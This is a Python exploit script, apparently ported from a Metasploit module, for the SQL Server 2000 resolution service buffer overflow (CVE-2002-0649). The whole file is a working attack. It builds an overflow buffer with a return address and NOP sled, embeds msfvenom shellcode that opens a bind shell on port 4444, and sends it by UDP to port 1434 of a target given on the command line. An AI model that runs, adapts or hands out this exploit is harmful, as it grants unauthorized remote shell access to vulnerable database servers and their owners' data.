#!/usr/bin/env python
import sys
import socket

# Name: Microsoft SQL Server Resolution Overflow
# Description: This is an exploit for the SQL Server 2000 resolution
#                service buffer overflow. This overflow is triggered by
#                sending a udp packet to port 1434 which starts with 0x04 and
#                is followed by long string terminating with a colon and a
#                number. This module should work against any vulnerable SQL
#                Server 2000 or MSDE install (pre-SP3).
# Original Author: hdm
# Port Author: rewardone
# License: MSF_LICENSE
# References: [ 'CVE', '2002-0649'],
#             [ 'OSVDB', '4578'],
#             [ 'BID', '5310'],
#             [ 'MSB', 'MS02-039']
# Privileged: True
# Payload: 'Space'    => 512,
#          'BadChars' => "\x00\x3a\x0a\x0d\x2f\x5c",
#          'StackAdjustment' => -3500
# Targets: 'MSSQL 2000 / MSDE <= SP2',
#          'Platform' => 'win',
#          'Ret'      => 0x42b48774

# Comments:
# This is a UDP 'send and forget' exploit. Generate and paste in your own shellcode.
# Listen on your port. Since this is a (rough) port from MSF, reliability should be
# the same as the MSF module; however, it was not tested as extensively.

#Setup arguments, target
if len(sys.argv) < 2:
    print "Usage ", sys.argv[0], " <target_ip>"
    print "You MUST use your own shellcode"
    print "Lazy PoC will set bind to 4444"
    sys.exit(0)

#Variable to hold 'junk'. Typically used to make initial overwrite
junk = "\x04"                       #HAS to start with \x04 to trigger the vulnerability
junk += "\x76\x6a\x6f\x7a\x68\x78\x3b\x40\x5a\x77\x72\x64\x40\x69\x6c\x68\x54\x24\x3e\x56\x69\x4f\x3c\x65\x79\x71\x42\x51\x59\x54\x52\x56\x57\x61\x7a\x42\x51\x3d\x34\x34\x38\x5b\x65\x40\x53\x41\x3c\x7d\x5d\x36\x52\x22\x77\x76\x5d\x6b\x4b\x6f\x38\x72\x62\x3d\x68\x7e\x53\x54\x32\x61\x55\x6d\x7b\x64\x33\x28\x77\x66\x65\x7c\x54\x30\x53\x23\x72\x43\x43\x64\x2b\x6e\x55\x60\x3f\x52\x43\x74\x3b\x6e"  # junk to get to overwrite
#junk += "\x3b\x6e"
junk += "\x74\x87\xb4\x42"          #RET offset from MSF
junk += "\x90\x90\x90\x90\x90\x90"  #6 NOPs
junk += "\xeb\x08"                  #jump 8 ahead
junk += "\xcc\xe0\xfd\x7f"          #write thread storage to avoid crash
junk += "\xcc\xe0\xfd\x7f"          #write thread storage to avoid crash

#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=thread -b "\x00\x3a\x0a\x0d\x2f\x5c" -f python
buf =  ""
buf += "\xda\xd6\xd9\x74\x24\xf4\x5d\xba\xbe\xdf\x92\xfa\x29"
buf += "\xc9\xb1\x53\x83\xed\xfc\x31\x55\x13\x03\xeb\xcc\x70"
buf += "\x0f\xef\x1b\xf6\xf0\x0f\xdc\x97\x79\xea\xed\x97\x1e"
buf += "\x7f\x5d\x28\x54\x2d\x52\xc3\x38\xc5\xe1\xa1\x94\xea"
buf += "\x42\x0f\xc3\xc5\x53\x3c\x37\x44\xd0\x3f\x64\xa6\xe9"
buf += "\x8f\x79\xa7\x2e\xed\x70\xf5\xe7\x79\x26\xe9\x8c\x34"
buf += "\xfb\x82\xdf\xd9\x7b\x77\x97\xd8\xaa\x26\xa3\x82\x6c"
buf += "\xc9\x60\xbf\x24\xd1\x65\xfa\xff\x6a\x5d\x70\xfe\xba"
buf += "\xaf\x79\xad\x83\x1f\x88\xaf\xc4\x98\x73\xda\x3c\xdb"
buf += "\x0e\xdd\xfb\xa1\xd4\x68\x1f\x01\x9e\xcb\xfb\xb3\x73"
buf += "\x8d\x88\xb8\x38\xd9\xd6\xdc\xbf\x0e\x6d\xd8\x34\xb1"
buf += "\xa1\x68\x0e\x96\x65\x30\xd4\xb7\x3c\x9c\xbb\xc8\x5e"
buf += "\x7f\x63\x6d\x15\x92\x70\x1c\x74\xfb\xb5\x2d\x86\xfb"
buf += "\xd1\x26\xf5\xc9\x7e\x9d\x91\x61\xf6\x3b\x66\x85\x2d"
buf += "\xfb\xf8\x78\xce\xfc\xd1\xbe\x9a\xac\x49\x16\xa3\x26"
buf += "\x89\x97\x76\xd2\x81\x3e\x29\xc1\x6c\x80\x99\x45\xde"
buf += "\x69\xf0\x49\x01\x89\xfb\x83\x2a\x22\x06\x2c\x45\xef"
buf += "\x8f\xca\x0f\x1f\xc6\x45\xa7\xdd\x3d\x5e\x50\x1d\x14"
buf += "\xf6\xf6\x56\x7e\xc1\xf9\x66\x54\x65\x6d\xed\xbb\xb1"
buf += "\x8c\xf2\x91\x91\xd9\x65\x6f\x70\xa8\x14\x70\x59\x5a"
buf += "\xb4\xe3\x06\x9a\xb3\x1f\x91\xcd\x94\xee\xe8\x9b\x08"
buf += "\x48\x43\xb9\xd0\x0c\xac\x79\x0f\xed\x33\x80\xc2\x49"
buf += "\x10\x92\x1a\x51\x1c\xc6\xf2\x04\xca\xb0\xb4\xfe\xbc"
buf += "\x6a\x6f\xac\x16\xfa\xf6\x9e\xa8\x7c\xf7\xca\x5e\x60"
buf += "\x46\xa3\x26\x9f\x67\x23\xaf\xd8\x95\xd3\x50\x33\x1e"
buf += "\xf3\xb2\x91\x6b\x9c\x6a\x70\xd6\xc1\x8c\xaf\x15\xfc"
buf += "\x0e\x45\xe6\xfb\x0f\x2c\xe3\x40\x88\xdd\x99\xd9\x7d"
buf += "\xe1\x0e\xd9\x57"

tail = ""
tail += "\x3a\x38\x38\x38"          #finish with \x68:888 => psh dword 0x3838383a

#Setup socket connection, received first 1024, and print
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    #DGRAM is UDP
s.connect((sys.argv[1],int('1434')))

#UDP is just connect and send
s.send(junk + buf + tail)

#End close
s.close()

print "Exploit sent!"
